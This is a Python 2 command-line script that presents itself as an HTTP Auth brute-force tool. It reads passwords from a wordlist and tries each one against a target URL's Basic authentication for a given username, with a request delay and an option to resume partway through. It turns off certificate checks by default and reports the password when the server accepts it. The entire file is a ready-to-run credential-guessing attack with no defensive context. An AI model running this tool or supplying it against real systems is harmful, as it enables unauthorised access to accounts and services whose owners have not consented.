#!/usr/bin/env python

from time import sleep
import httplib2
import sys
import argparse
import signal


# Print the current line on when terminated via ctrl-c
def signal_handler(signal, frame):
    print 'Stopped at line: ' + str(currentLine)
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# PARSING ARGS

parser = argparse.ArgumentParser(description='HTTP Auth Brute Force Tool')
parser.add_argument('Target', metavar='target', type=str, help='The target URI. ex http://192.168.1.1')
parser.add_argument('Wordlist', metavar='words', type=str, help='The wordlist to choose passwords from')
parser.add_argument('Username', metavar='user', type=str, help='The username to use')
parser.add_argument("--delay", type=int, help='Time in milliseconds between each request', default=5)
parser.add_argument("--startat", type=int, help='Start at this line in the file', default=0)
parser.add_argument("--ignore-consecutive-empty", type=int, help='Ignore this many consec. empty lines before exiting',
                    default=4)
parser.add_argument("--ignore-invalid-certificate", type=bool, help='Ignore untrusted certs', default=True)

args = parser.parse_args()
# END ARGS

# GLOBAL VARS
delay = args.delay
target = args.Target
username = args.Username
wordlist = args.Wordlist
startAt = args.startat
count = 0
maxEmptyCount = args.ignore_consecutive_empty
currentLine = 0
ignoreBadCerts = args.ignore_invalid_certificate
# END VARS

with open(wordlist, "r") as f:
    pwd = f.readline().strip('\n')
    if startAt > 0:
        print "Skipping: " + str(startAt)
        while count < startAt:
            pwd = f.readline().rstrip('\n')
            count += 1
    while pwd:
        currentLine += 1
        emptyCount = 0
        print pwd
        http = httplib2.Http()
        http.disable_ssl_certificate_validation = ignoreBadCerts
        http.add_credentials(username, pwd)
        res, content = http.request(target)
        print res.status
        if res.status == 200:
            print "The password is: " + pwd
            print "At line" + str(currentLine)
            sys.exit(0)
        pwd = f.readline().rstrip('\n')
        while not pwd:
            emptyCount += 1
            if emptyCount > maxEmptyCount:
                sys.exit(0)
            pwd = f.readline().rstrip('\n')
        sleep(delay / 1000.0)



